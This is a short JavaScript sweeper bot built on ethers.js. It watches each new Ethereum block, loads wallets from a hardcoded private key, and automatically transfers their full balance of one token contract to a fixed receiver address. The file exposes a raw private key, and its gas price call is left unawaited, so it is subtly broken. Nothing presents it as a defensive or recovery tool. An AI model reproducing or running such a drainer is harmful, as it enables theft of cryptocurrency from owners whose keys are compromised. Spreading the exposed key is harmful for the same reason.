const { EtherscanProvider } = require('@ethersproject/providers')
const { sign } = require('crypto')
const { ethers, Wallet, Signer } = require('ethers')
const { TransactionDescription, TransactionTypes } = require('ethers/lib/utils')

const provider = new ethers.providers.JsonRpcProvider("https://rpc.ankr.com/eth")

const addressReceiver = '0xDa6988687Fb551CF2d0755B9fbe6bb612FDF955B'

const privateKeys = ["5b5c10a1e2c3062fbe925bd7ddadde1d9019bc1891a9839376d016e025afca07"] 

process.on('uncaughtException', function(err) {
    console.log('Caught exception: ' + err);
  });

const contractAddress = "0x9fdfb933ee990955d3219d4f892fd1f786b47c9b" 

const BEP20ABI = [
    "function transfer(address to, uint amount)"
];

const balABI = [{
    "constant": true,
    "inputs": [{
        "internalType": "address",
        "name": "account",
        "type": "address"
    }],
    "name": "balanceOf",
    "outputs": [{
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}]

const bot = async =>{
    provider.on('block', async () => {
        console.log('Scanning new block.. ;)');
        for (let i = 0; i < privateKeys.length; i++){
            const _target = new ethers.Wallet(privateKeys[i]);
            const target = _target.connect(provider);
            const balance = await provider.getBalance(target.address);
            const nonce = await provider.getTransactionCount(target.address)

            // Balance
            const signer = new ethers.Wallet(privateKeys[i], provider);
            const _contract = new ethers.Contract(contractAddress, balABI, provider);
            const contract = _contract.connect(signer);
            const tokenBal = await contract.balanceOf(target.address);

            // Data
            let iface = new ethers.utils.Interface(BEP20ABI);
            let data = iface.encodeFunctionData("transfer", [addressReceiver, tokenBal])

             // Custom Gas Price       
            const gasPrice = provider.getGasPrice()
            
            if (tokenBal > 10){ 


                try {
                    await target.sendTransaction({
                        from: target.address,
                        to: contractAddress,
                        gasLimit: 120000,
                        gasPrice: gasPrice,
                        nonce: nonce,
                        data: data,
                    });
                    console.log(`Transfer broadcasted without errors..`);
                } catch(e){
                    console.log(`error: ${e}`);
                }
            }
        }
    })
}
bot();